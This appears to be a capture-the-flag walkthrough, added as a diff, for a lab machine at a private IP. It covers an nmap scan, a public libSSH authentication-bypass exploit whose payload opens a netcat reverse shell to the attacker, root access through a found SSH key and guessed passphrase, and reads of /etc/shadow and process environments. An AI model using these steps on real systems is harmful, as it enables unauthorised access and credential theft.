@@ -1,0 +1,48 @@
+sudo nmap -p- --min-rate=10000 -Pn -sC -sV 10.0.100.34
+search for the libssh version on google or searchsploit
+got two exploits:
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                 |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+libSSH - Authentication Bypass                                                                                                                 | linux/remote/45638.py
+LibSSH 0.7.6 / 0.8.4 - Unauthorized Access                                                                                                     | linux/remote/46307.py
+
+
+The second one is working
+run this command on your machine to start netcat listener:
+nc -nlvp <LISTENING_PORT>
+
+Open another terminal and run the exploit
+The command will look like:
+python 46307.py 10.0.100.34 6022 "nc -e /bin/sh <YOUR_IP> <Listening_PORT>"
+
+you will get the shell at this point you can only get one flag from /etc/passwd
+use python for a tty shell
+python -c "import pty;pty.spawn('/bin/bash')"
+
+Privilege Escalation:
+ start enumerating the target you can use linpeas or manual whatever you prefer
+I started looking for ssh keys and luckily found one but it wasn't working from the attacker machine
+so I kept enumerating the target
+Command:
+ss -ant
+
+RESULT:
+
+ETSCTF@flanders:/$ ss -ant
+State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
+LISTEN     0      10           *:6022                     *:*
+LISTEN     0      128    127.0.0.1:22                     *:*
+
+Now we see that port 22 is open but only localhost can connect on further search with "ps -eafww" I found that ssh is running as root and listening on this port 
+ I used the key found earlier to connect to the localhost via ssh using
+ssh -i .ssh/mykey root@127.0.0.1
+but the key is encrypted with some passphrase by looking at the machine's description the catch phrase is "Okily Dokily" it didn't work in the first try but when I removed the 
+space it worked and we are root now
+LOCATION OF FLAGS:
+/root/
+/etc/passwd
+/etc/shadow
+strings /proc/*/environ | grep ETSCTF
